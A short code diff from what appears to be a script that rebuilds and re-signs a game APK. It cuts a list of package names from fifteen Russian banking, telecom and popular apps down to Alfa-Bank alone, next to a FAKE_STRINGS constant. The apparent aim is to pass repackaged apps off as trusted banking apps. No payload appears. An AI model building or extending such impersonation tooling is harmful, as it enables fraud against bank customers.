@@ -110,21 +110,7 @@ UNSIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-unsigned.apk")
 ALIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-aligned.apk")
 OUTPUT_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game.apk")
 PACKAGE_CHOICES = [
-    "ru.sberbankmobile",
-    "com.idamob.tinkoff.android",
-    "ru.rostel",
-    "ru.duplex.mobi",
-    "ru.mts.mymts",
-    "ru.mail.cloud",
-    "com.avito.android",
-    "ru.yandex.taxi",
-    "com.vkontakte.android",
-    "ru.ok.android",
-    "ru.alfabank.mobile.android",
-    "ru.vtb24.mobilebanking.android",
-    "ru.megafon.mlk",
-    "ru.mail.mailapp",
-    "ru.ozon.app.android",
+    "ru.alfabank.mobile.android", 
 ]
 
 FAKE_STRINGS = [
